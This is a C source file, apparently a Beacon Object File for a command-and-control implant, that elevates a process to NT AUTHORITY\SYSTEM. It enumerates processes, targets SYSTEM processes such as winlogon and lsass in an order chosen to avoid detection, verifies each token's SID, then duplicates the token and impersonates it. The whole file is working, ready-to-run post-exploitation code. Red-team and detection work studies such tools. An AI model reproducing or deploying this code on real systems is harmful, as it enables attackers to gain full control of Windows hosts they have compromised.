/*
 * getsystem.c — Elevate to NT AUTHORITY\SYSTEM
 *
 * Token duplication from a SYSTEM process.
 * NO threads, NO pipes, NO services, NO child processes.
 * Cannot hang or block.
 */
#include <windows.h>
#include "beacon_compat.h"

/* ── kernel32 ── */
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentThread(void);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT int    WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);

/* ── advapi32 ── */
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$OpenThreadToken(HANDLE, DWORD, BOOL, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, PVOID, DWORD, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$GetTokenInformation(HANDLE, DWORD, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$RevertToSelf(void);
DECLSPEC_IMPORT BOOL   WINAPI ADVAPI32$LookupAccountSidW(LPCWSTR, PSID, LPWSTR, LPDWORD, LPWSTR, LPDWORD, PDWORD);

/* ── ntdll ── */
DECLSPEC_IMPORT DWORD NTAPI NTDLL$NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);

/* ── msvcrt ── */
DECLSPEC_IMPORT int __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int __cdecl MSVCRT$memcmp(const void*, const void*, size_t);

/* ── Constants ── */
#ifndef PROCESS_QUERY_INFORMATION
#define PROCESS_QUERY_INFORMATION   0x0400
#endif
#ifndef TOKEN_ALL_ACCESS
#define TOKEN_ALL_ACCESS            0x000F01FF
#endif
#ifndef TOKEN_QUERY
#define TOKEN_QUERY                 0x0008
#endif
#ifndef TOKEN_DUPLICATE
#define TOKEN_DUPLICATE             0x0002
#endif
#ifndef TOKEN_IMPERSONATE
#define TOKEN_IMPERSONATE           0x0004
#endif
#ifndef MEM_COMMIT
#define MEM_COMMIT                  0x1000
#endif
#ifndef MEM_RESERVE
#define MEM_RESERVE                 0x2000
#endif
#ifndef MEM_RELEASE
#define MEM_RELEASE                 0x8000
#endif
#ifndef PAGE_READWRITE
#define PAGE_READWRITE              0x04
#endif

#define MY_SecurityDelegation       3
#define MY_SecurityImpersonation    2
#define MY_TokenImpersonation       2
#define MY_TokenUser                1
#define SystemProcessInformation    5

/*
 * Check if a token belongs to NT AUTHORITY\SYSTEM.
 * Compares the token user SID against well-known S-1-5-18.
 *
 * S-1-5-18 in binary:
 *   Revision=1, SubAuthorityCount=1,
 *   IdentifierAuthority={0,0,0,0,0,5},
 *   SubAuthority[0]=18
 */
static BOOL is_system_token(HANDLE hToken) {
    BYTE buf[512];
    DWORD needed = 0;

    if (!ADVAPI32$GetTokenInformation(hToken, MY_TokenUser, buf, sizeof(buf), &needed))
        return FALSE;

    /* TOKEN_USER layout (x64):
     *   offset 0: PSID pointer (8 bytes)
     *   offset 8: DWORD Attributes (4 bytes)
     * The SID data itself is stored after the structure in the same buffer.
     */
    PSID pSid = *(PSID*)buf;
    if (!pSid) return FALSE;

    /* Parse SID manually:
     * Byte 0: Revision (must be 1)
     * Byte 1: SubAuthorityCount
     * Bytes 2-7: IdentifierAuthority (6 bytes)
     * Bytes 8+: SubAuthority array (4 bytes each)
     */
    BYTE *sidBytes = (BYTE*)pSid;

    BYTE revision = sidBytes[0];
    BYTE subAuthCount = sidBytes[1];

    /* S-1-5-18: revision=1, 1 sub-authority, authority=5, sub-auth=18 */
    if (revision != 1) return FALSE;
    if (subAuthCount != 1) return FALSE;

    /* Authority bytes [2..7] must be {0,0,0,0,0,5} */
    if (sidBytes[2] != 0 || sidBytes[3] != 0 || sidBytes[4] != 0 ||
        sidBytes[5] != 0 || sidBytes[6] != 0 || sidBytes[7] != 5)
        return FALSE;

    /* SubAuthority[0] at offset 8, little-endian uint32 = 18 (0x12) */
    DWORD subAuth = *(DWORD*)(sidBytes + 8);
    if (subAuth != 18) return FALSE;

    return TRUE;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);
    BeaconDataInt(&parser); /* technique arg — ignored, only one technique */

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] GetSystem — token duplication from SYSTEM process\n");

    /* Target processes in OPSEC preference order */
    const wchar_t *targets[] = {
        L"winlogon.exe",
        L"services.exe",
        L"spoolsv.exe",
        L"svchost.exe",
        L"lsass.exe",
        NULL
    };

    /* Enumerate processes */
    ULONG bufSize = 2 * 1024 * 1024;
    PVOID buffer = KERNEL32$VirtualAlloc(NULL, bufSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc failed\n");
        return;
    }

    ULONG retLen = 0;
    DWORD status;
    while ((status = NTDLL$NtQuerySystemInformation(
            SystemProcessInformation, buffer, bufSize, &retLen)) == 0xC0000004) {
        KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
        bufSize = retLen + 8192;
        buffer = KERNEL32$VirtualAlloc(NULL, bufSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) {
            BeaconPrintf(CALLBACK_ERROR, "[!] VirtualAlloc retry failed\n");
            return;
        }
    }

    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] NtQuerySystemInformation: 0x%08x\n", status);
        KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Process list obtained, scanning...\n");

    BOOL success = FALSE;

    for (int t = 0; targets[t] && !success; t++) {
        BYTE *current = (BYTE*)buffer;

        while (1) {
            DWORD nextOffset = *(DWORD*)(current + 0x00);
            DWORD pid        = (DWORD)(*(ULONG_PTR*)(current + 0x50));
            USHORT nameLen   = *(USHORT*)(current + 0x38);
            wchar_t *nameBuf = *(wchar_t**)(current + 0x38 + sizeof(ULONG_PTR));

            if (pid > 4 && nameLen > 0 && nameBuf) {
                wchar_t procName[128];
                int copyLen = nameLen / 2;
                if (copyLen > 127) copyLen = 127;
                for (int i = 0; i < copyLen; i++)
                    procName[i] = nameBuf[i];
                procName[copyLen] = 0;

                if (MSVCRT$_wcsicmp(procName, targets[t]) == 0) {
                    char aProc[128] = {0};
                    KERNEL32$WideCharToMultiByte(CP_UTF8, 0,
                        procName, -1, aProc, 128, NULL, NULL);

                    /* Step 1: Open the process */
                    HANDLE hProc = KERNEL32$OpenProcess(
                        PROCESS_QUERY_INFORMATION, FALSE, pid);
                    if (!hProc) {
                        BeaconPrintf(CALLBACK_OUTPUT,
                            "    [-] %s (PID %u): OpenProcess failed (%u)\n",
                            aProc, pid, KERNEL32$GetLastError());
                        goto next_entry;
                    }

                    /* Step 2: Open its token */
                    HANDLE hToken = NULL;
                    if (!ADVAPI32$OpenProcessToken(hProc,
                            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                            &hToken)) {
                        BeaconPrintf(CALLBACK_OUTPUT,
                            "    [-] %s (PID %u): OpenProcessToken failed (%u)\n",
                            aProc, pid, KERNEL32$GetLastError());
                        KERNEL32$CloseHandle(hProc);
                        goto next_entry;
                    }

                    /* Step 3: Verify it's SYSTEM */
                    if (!is_system_token(hToken)) {
                        BeaconPrintf(CALLBACK_OUTPUT,
                            "    [-] %s (PID %u): not a SYSTEM token\n",
                            aProc, pid);
                        KERNEL32$CloseHandle(hToken);
                        KERNEL32$CloseHandle(hProc);
                        goto next_entry;
                    }

                    /* Step 4: Duplicate */
                    HANDLE hDup = NULL;
                    if (!ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS,
                            NULL, MY_SecurityImpersonation, MY_TokenImpersonation,
                            &hDup)) {
                        BeaconPrintf(CALLBACK_OUTPUT,
                            "    [-] %s (PID %u): DuplicateTokenEx failed (%u)\n",
                            aProc, pid, KERNEL32$GetLastError());
                        KERNEL32$CloseHandle(hToken);
                        KERNEL32$CloseHandle(hProc);
                        goto next_entry;
                    }

                    /* Step 5: Impersonate */
                    if (!ADVAPI32$ImpersonateLoggedOnUser(hDup)) {
                        BeaconPrintf(CALLBACK_OUTPUT,
                            "    [-] %s (PID %u): ImpersonateLoggedOnUser failed (%u)\n",
                            aProc, pid, KERNEL32$GetLastError());
                        KERNEL32$CloseHandle(hDup);
                        KERNEL32$CloseHandle(hToken);
                        KERNEL32$CloseHandle(hProc);
                        goto next_entry;
                    }

                    BeaconPrintf(CALLBACK_OUTPUT,
                        "[+] SYSTEM token from %s (PID %u)\n", aProc, pid);
                    success = TRUE;

                    KERNEL32$CloseHandle(hToken);
                    KERNEL32$CloseHandle(hProc);
                    /* hDup stays open — impersonation holds it */
                    break;
                }
            }
next_entry:
            if (nextOffset == 0) break;
            current += nextOffset;
        }
    }

    KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);

    if (success) {
        /* Verify thread token */
        HANDLE hThreadToken = NULL;
        if (ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(),
                TOKEN_QUERY, FALSE, &hThreadToken)) {
            /* Resolve name for display (single call, won't loop) */
            BYTE ubuf[512];
            DWORD uneeded = 0;
            if (ADVAPI32$GetTokenInformation(hThreadToken, MY_TokenUser,
                    ubuf, sizeof(ubuf), &uneeded)) {
                PSID pSid = *(PSID*)ubuf;
                wchar_t name[128] = {0}, domain[128] = {0};
                DWORD nLen = 128, dLen = 128, use = 0;
                if (ADVAPI32$LookupAccountSidW(NULL, pSid, name, &nLen,
                        domain, &dLen, &use)) {
                    char aName[128] = {0}, aDomain[128] = {0};
                    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, name, -1, aName, 128, NULL, NULL);
                    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, domain, -1, aDomain, 128, NULL, NULL);
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "[+] Thread token: %s\\%s\n", aDomain, aName);
                }
            }
            KERNEL32$CloseHandle(hThreadToken);
            BeaconPrintf(CALLBACK_OUTPUT,
                "[+] SUCCESS — elevated to SYSTEM\n"
                "[*] Use 'tokenmanip --action revert' to drop\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] Impersonation set but OpenThreadToken failed (%u)\n",
                KERNEL32$GetLastError());
            ADVAPI32$RevertToSelf();
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "\n[!] All targets failed — see details above\n"
            "[*] Need HIGH integrity (run as local admin)\n");
    }
}
